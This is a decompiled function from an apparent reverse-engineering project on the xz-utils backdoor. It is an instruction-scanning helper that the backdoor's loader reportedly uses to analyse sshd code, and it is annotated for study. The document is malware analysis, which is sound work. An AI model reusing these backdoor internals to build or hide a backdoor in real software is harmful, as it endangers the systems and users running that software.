// /home/kali/xzre-ghidra/xzregh/101060_find_instruction_with_mem_operand_ex.c
// Function: find_instruction_with_mem_operand_ex @ 0x101060
// Calling convention: unknown
// Prototype: undefined find_instruction_with_mem_operand_ex(void)


/*
 * AutoDoc: Performs a generic sweep for any instruction that touches memory, applying a caller-supplied predicate to filter the operands. The loader routes specialised searches through it when reconstructing complex data flows in sshd.
 */
#include "xzre_types.h"


undefined8
find_instruction_with_mem_operand_ex
          (ulong param_1,ulong param_2,long *param_3,int param_4,long param_5)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  byte bVar4;
  long local_80 [11];
  
  bVar4 = 0;
  iVar1 = secret_data_append_from_call_site(0xd6,4,0xe,0);
  if (iVar1 != 0) {
    plVar3 = local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)plVar3 = 0;
      plVar3 = (long *)((long)plVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    if (param_3 == (long *)0x0) {
      param_3 = local_80;
    }
    for (; param_1 < param_2; param_1 = param_1 + 1) {
      iVar1 = x86_dasm(param_3,param_1,param_2);
      if ((((iVar1 != 0) && ((int)param_3[5] == param_4)) &&
          ((*(uint *)((long)param_3 + 0x1c) & 0xff00ff00) == 0x5000000)) &&
         ((param_5 == 0 ||
          (((*(byte *)((long)param_3 + 0x11) & 1) != 0 &&
           (param_5 == param_3[6] + *param_3 + param_3[1])))))) {
        return 1;
      }
    }
  }
  return 0;
}

